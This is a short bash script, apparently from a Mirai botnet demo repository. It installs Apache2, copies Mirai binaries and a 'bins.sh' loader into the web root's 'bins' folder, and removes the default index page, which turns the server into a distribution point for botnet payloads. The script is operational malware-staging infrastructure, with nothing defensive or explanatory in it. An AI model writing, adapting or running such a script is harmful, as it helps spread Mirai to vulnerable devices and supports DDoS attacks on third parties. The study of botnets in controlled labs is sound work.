if ! command -v apache2 &> /dev/null
then
    echo "Insatlling Apache2"
    sudo apt-get update
    sudo apt-get install apache2 -y
else
    echo "Apache2 is installed"
fi


sudo apt-get install apache2 -y
service apache2 start

cd /ReadMine-Mirai-Demo-Files/release

cp mirai.* /var/www/html/bins
cp bins.sh /var/www/html/bins
rm /var/www/html/index.html

echo "Done"

